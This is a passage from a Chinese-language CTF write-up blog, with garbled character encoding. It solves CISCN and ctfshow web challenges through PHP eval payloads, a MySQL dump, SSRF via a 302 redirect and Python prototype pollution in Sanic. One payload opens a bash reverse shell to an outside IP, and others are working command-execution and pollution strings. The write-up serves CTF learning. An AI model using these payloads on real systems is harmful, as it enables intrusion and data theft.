<code>substr()</code> å‡½æ•°çš„<strong>ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦ä¸€ä¸ªå­—ç¬¦ä¸²</strong>ï¼Œè€Œ PHP ä¼šå°è¯•å°†ä¼ é€’çš„ä»»ä½•æ•°æ®è½¬æ¢ä¸ºæœŸæœ›çš„ç±»å‹ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œpayload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=php -r eval(hex2bin(substr(Gu0f3n73797374656d28276c73202f27293b,6)));</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œ </p><p>æŸ¥æ‰¾&#x2F;ç›®å½•å‘ç°æ²¡ä¸œè¥¿ ä½†æ˜¯ ps å‘ç°æœ‰sqlè¿›ç¨‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo `mysql -u root -p&#x27;root&#x27; -e &#x27;show databases;&#x27;`;</span></span><br><span class="line">cmd=php+-r+<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(Gu0f3n6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773686f77206461746162617365733b27603b,<span class="number">6</span>)));</span><br></pre></td></tr></table></figure><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A510%E7%82%B953%E5%88%86.png" alt="image-20240801105235342"></p><p>çˆ†å‡ºåº“å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># select * from PHP_CMS.F1ag_Se3Re7;</span><br><span class="line">cmd=php+-r+eval(hex2bin(substr(Gu0f3n6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773656c656374202a2066726f6d205048505f434d532e463161675f5365335265373b27603b,6)));</span><br></pre></td></tr></table></figure><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A510%E7%82%B955%E5%88%86.png" alt="image_5"></p><p>è¿˜æœ‰ä¸ªæ›´ç®€å•çš„payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases</span><br></pre></td></tr></table></figure><p>ç›´æ¥æŠŠæ‰€æœ‰åº“çš„æ‰€æœ‰æ•°æ®æŸ¥å‡ºæ¥ ç„¶åæ‰¾flag</p><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>hint:ç®€å•çš„cmsï¼Œå¯ä»¥æ‰«æ‰«çœ‹ï¼Ÿ æç¤º1ï¼š &#x2F;flag.phpï¼š </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">   echo &quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;;</span><br><span class="line">   return;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æç¤º2ï¼šgithubæ‰¾ä¸€ä¸‹æºç ?</p><p>æ‰¾åˆ°æºç </p><p><a href="https://github.com/dayrui/xunruicms">https://github.com/dayrui/xunruicms</a></p><p>ä¿¡æ¯æ‰“ç‚¹ å‘ç°è¿™ä¸ªcmsçš„æ¼æ´å…¬ç¤º<a href="https://www.xunruicms.com/bug/">https://www.xunruicms.com/bug/</a></p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B908%E5%88%86.png" alt="image-20240801200813912"></p><p>å®šä½è·¯å¾„xunruicms-master\dayrui\Fcms\Control\Api\Api.php</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B910%E5%88%86.png" alt="image-20240801201003706"></p><p>ssrfæ¼æ´</p><p>å®šä½è¿™ä¸ªå‡½æ•°<strong>dr_catcher_data</strong></p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B911%E5%88%86.png" alt="image-20240801201134900"></p><p>è¯•äº†ä¸‹è¾“å…¥æœ¬åœ°ä¸è¡Œ</p><p>302è·³è½¬</p><p>è‡ªå·±vpsä¸Šé¢æ„å»º302.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1/flag.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.149.246.169%2F2222%200%3E%261%22&quot;</span>);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://vps:7777/ctf/302.php&amp;size=6666&amp;level=1</span><br></pre></td></tr></table></figure><p>åå¼¹shell</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B916%E5%88%86.png" alt="image-20240801201517830"></p><p>å¡äº†ï¼Ÿ è¯•äº†å‡ æ¬¡éƒ½è¿™æ · </p><p>gg è·‘è·¯ å¤ç°å¤±è´¥ â”­â”®ï¹â”­â”®</p><h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><p>ä¾æ—§æ˜¯è¿™ä½å¤§ä½¬gxngxngxn</p><p>å‚è€ƒ</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p><p>è¿›å…¥srcè·¯ç”±</p><p>æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br></pre></td></tr></table></figure><p>åˆ†æä¸‹è¿™æ®µ åœ¨&#x2F;loginè·¯ç”±å¤„æˆ‘ä»¬éœ€è¦ç»•è¿‡**user.lower() &#x3D;&#x3D; â€˜adm;nâ€™**çš„é™åˆ¶ï¼Œç”±äºè¿™é‡Œæ˜¯ä»sessionä¸­è¯»å–ï¼Œæ‰€ä»¥é»˜è®¤æ˜¯ä¼šåœ¨åˆ†å·å¤„æˆªæ–­ï¼Œç›´æ¥ä¼ è‚¯å®šæ˜¯ä¸è¡Œçš„</p><p>åˆ©ç”¨å…«è¿›åˆ¶ç»•è¿‡</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B926%E5%88%86.png" alt="image-20240801202640883"></p><p>åŸç†ä¹‹å‰DASCTFå¤ç°çš„æ—¶å€™è®²è¿‡äº†</p><p>æ‰€ä»¥ç›´æ¥ä¸Šæ“ä½œ</p><p>å¾—åˆ°adminçš„session</p><p>è¿›å…¥admin</p><p>ç›´æ¥æ±¡æŸ“</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagå</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A521%E7%82%B908%E5%88%86.png" alt="image-20240801210841152"></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;.__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/24bcbd0192e591d6ded1_flag&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®src æ‹¿flag</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A521%E7%82%B910%E5%88%86.png" alt="image-20240801211003726"></p><h2 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h2><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2>]]></content>
      
      
      <categories>
          
          <category> ciscn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowæ‘†çƒ‚æ¯å¤ç°</title>
      <link href="/2024/07/28/ctfshow%E6%91%86%E7%83%82%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/07/28/ctfshow%E6%91%86%E7%83%82%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€è¡Œä»£ç "><a href="#ä¸€è¡Œä»£ç " class="headerlink" title="ä¸€è¡Œä»£ç "></a>ä¸€è¡Œä»£ç </h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">\# -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Date</span>:  2021-11-18 21:25:22</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified by:  h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified time: 2021-11-18 22:14:12</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> !(!(<span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>)||(!<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>))||<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&#x27;.&#x27;</span>)||(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]!=<span class="number">0</span>)||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])&lt;=<span class="number">7</span>)||(!<span class="title function_ invoke__">eregi</span>(<span class="string">&quot;ctfsho&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>],<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;ctfshow&quot;</span>))||<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>],<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&#x27;w&#x27;</span>||(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&#x27;r&#x27;</span>) !== <span class="string">&quot;welcome2ctfshow&quot;</span>))?<span class="variable">$flag</span>:<span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>åˆ†æä¸‹æºç </p><ol><li>æˆåŠŸåŒ…å« <code>flag.php</code> æ–‡ä»¶ã€‚</li><li>é”™è¯¯æŠ¥å‘Šå·²å…³é—­ã€‚</li><li><code>$_GET[&#39;filename&#39;]</code> ä¸­ä¸åŒ…å« <code>.</code>ã€‚</li><li><code>$_GET[&#39;id&#39;]</code> ç­‰äº <code>0</code>ã€‚</li><li><code>$_GET[&#39;content&#39;]</code> çš„é•¿åº¦å¤§äº7ã€‚</li><li><code>$_GET[&#39;content&#39;]</code> çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ <code>ctfshow</code> åŒ¹é…ã€‚</li><li><code>$_GET[&#39;content&#39;]</code> çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ä¸º <code>w</code>ã€‚</li><li><code>$_GET[&#39;filename</code> çš„å†…å®¹ä¸º <code>welcome2ctfshow</code>ã€‚</li></ol><p>å¦‚æœæ‰€æœ‰è¿™äº›æ¡ä»¶éƒ½æ»¡è¶³ï¼Œåˆ™è¾“å‡º <code>$flag</code></p><p>id&#x3D;0æ²¡ä»€ä¹ˆè®²çš„ cotentå†…å®¹å¤§äº7.ä¸”ç¬¬ä¸€ä¸ªå­—æ¯ä¸ä¸ºw,ä½†åˆè¦ä¸welcome ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸€æ ·</p><p>æœç´¢ä¸‹eregi(string,string)</p><p>å‘ç°ä½œç”¨å°±æ˜¯ç”¨æ¥è¿›è¡Œå­—ç¬¦ä¸²åŒ¹é…çš„ï¼Œä½†æ˜¯ä»–ä¸åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ç›´æ¥ç¬¬ä¸€ä¸ªå­—æ¯å¤§å†™Wå°±å¥½äº†</p><p>filename è¦ä¸ºwelcome2ctfshow ä½†ä¸èƒ½ç›´æ¥ä¿„getä¼  å› ä¸ºè¿™æ ·ä¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥</p><p>æ‰€æœ‰ç”¨ä¼ªåè®®php:&#x2F;&#x2F;input</p><p>è®©åPOSTæäº¤welcome2ctfshow</p><p>GET: ?id&#x3D;0&amp;content&#x3D;W2Gu0f3n&amp;filename&#x3D;php:&#x2F;&#x2F;input</p><p>POST:welcome2ctfshow</p><p><img src="/imgs/2024%E5%B9%B47%E6%9C%8828%E6%97%A510%E7%82%B924%E5%88%86.png" alt="image-20240728102150005"></p><h2 id="é»‘å®¢ç½‘ç«™"><a href="#é»‘å®¢ç½‘ç«™" class="headerlink" title="é»‘å®¢ç½‘ç«™"></a>é»‘å®¢ç½‘ç«™</h2><p>æ‰“å¼€å…¶å®å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tyro s4qw s3mm bubg jqje 46nc v35j aqjg eb3n qiuf 23ij oj4z wasx ohyd onion</span><br></pre></td></tr></table></figure><p>å¾ªç¯ çœ‹åˆ° onion åº”è¯¥éƒ½ä¸é™Œç”Ÿ</p><p>ä¸‹è½½æ´‹è‘±æµè§ˆå™¨ç›´æ¥æœå°±æ˜¯äº†ï¼Œä½†æ˜¯æ´‹è‘±éƒ½çŸ¥é“æ˜¯å¹²å˜›çš„å§ï¼ˆ(â—â€™â—¡â€™â—)ï¼‰</p><h2 id="webç­¾åˆ°"><a href="#webç­¾åˆ°" class="headerlink" title="webç­¾åˆ°"></a>webç­¾åˆ°</h2><p>è®¡ç®—æ–¹å¼ä¸º(A)**3+(B)**3+(c)**3</p><p>ç”¨æ‹¬å·ç»•è¿‡å³å¯ï¼Œ</p><p>a&#x3D;+114)+(0</p><p>bå’Œcéƒ½ä¸º-0å°±å¯ä»¥</p><p>(+114)+(0)**3+(-0)**3+(-0)**3 &#x3D;114</p><h2 id="ç™»é™†ä¸äº†"><a href="#ç™»é™†ä¸äº†" class="headerlink" title="ç™»é™†ä¸äº†"></a>ç™»é™†ä¸äº†</h2><p>æ³¨å†Œå‘ç°éªŒè¯ç æ²¡ç”¨åˆ°</p><p>æ‰“å¼€éªŒè¯ç å›¾ç‰‡ä½ç½®</p><p>ç¡®å®šå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p><p>okï¼Œä¸ä¼šäº† gg ææ¡¶è·‘è·¯ ãƒ¾(â€¢Ï‰â€¢&#96;)o</p><p>å“ˆå“ˆå“ˆ è¿˜æ˜¯å¾—å¥½å¥½å¤ç°ï¼ˆä¹‹åè¡¥ä¸Šå˜¿å˜¿ï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sanic&#39;s revenge(å¤ç°)</title>
      <link href="/2024/07/24/Sanic-s-revenge-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/07/24/Sanic-s-revenge-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>å¤ç°è¿™ä¸ªä¹‹å‰å…ˆè¦å­¦ä¹ ä¸‹pythonçš„åŸå‹é“¾æ±¡æŸ“ï¼ˆæœªå­¦â”­â”®ï¹â”­â”®ï¼‰</p><p>ä¹‹å‰å­¦äº†NodejsåŸå‹é“¾æ±¡æŸ“ï¼ŒPythonåŸå‹é“¾æ±¡æŸ“å’ŒNodejsåŸå‹é“¾æ±¡æŸ“çš„æ ¹æœ¬åŸç†ä¸€æ ·ï¼ŒNodejsæ˜¯å¯¹é”®å€¼å¯¹çš„æ§åˆ¶æ¥è¿›è¡Œæ±¡æŸ“ï¼Œè€ŒPythonåˆ™æ˜¯å¯¹ç±»å±æ€§å€¼çš„æ±¡æŸ“ï¼Œä¸”åªèƒ½å¯¹ç±»çš„å±æ€§æ¥è¿›è¡Œæ±¡æŸ“ä¸èƒ½å¤Ÿæ±¡æŸ“ç±»çš„æ–¹æ³•ã€‚</p><p>å…ˆçœ‹ç»™çš„æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">import</span> pydash  </span><br><span class="line"></span><br><span class="line"><span class="comment"># pydash==5.1.2  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œçš„æºç å¥½åƒè¢«adminåˆ æ‰äº†ä¸€äº›ï¼Œå¬ä»–è¯´é‡Œé¢è—æœ‰å¤§ç§˜å¯†  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="keyword">pass</span>  </span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)  </span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/*****secret********&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):  </span><br><span class="line">    secret=<span class="string">&#x27;**************************&#x27;</span>  </span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;can you find my route name ???&quot;</span>+secret)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):  </span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):  </span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]  </span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]  </span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:  </span><br><span class="line">        pollute = Pollute()  </span><br><span class="line">        pydash.set_(pollute, key, value)  </span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)  </span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span>  </span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span>  </span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span>  </span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);  </span><br><span class="line">        <span class="comment"># ç”Ÿæˆæ—¥å¿—æ–‡ä»¶  </span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            f.write(log)  </span><br><span class="line">        <span class="comment"># å¤‡ä»½æ—¥å¿—æ–‡ä»¶  </span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            f.write(log)  </span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;ï¼ï¼ï¼æ­¤åœ°ç¦æ­¢èƒ¡æ¥ï¼Œä½ çš„éæ³•æ“ä½œå·²ç»è¢«è®°å½•ï¼ï¼ï¼&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°Pollute è·¯ç”±è¿™æ®µ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span 